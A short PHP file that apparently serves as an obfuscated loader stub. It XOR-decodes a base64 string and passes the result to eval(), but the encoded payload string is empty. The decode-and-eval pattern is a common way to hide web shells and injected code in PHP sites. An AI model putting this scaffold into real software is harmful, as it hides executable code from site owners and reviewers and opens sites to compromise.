<?PHP
	function decode($s)
	{
		for ($i=0; $i<strlen($s); $i++)
		{
			$k = ord($s[$i]) ^ 34;
			$new .= chr($k);
		}
		return $new;
	}
	
	$code = base64_decode("");
	$code = decode($code);
	eval($code);
?>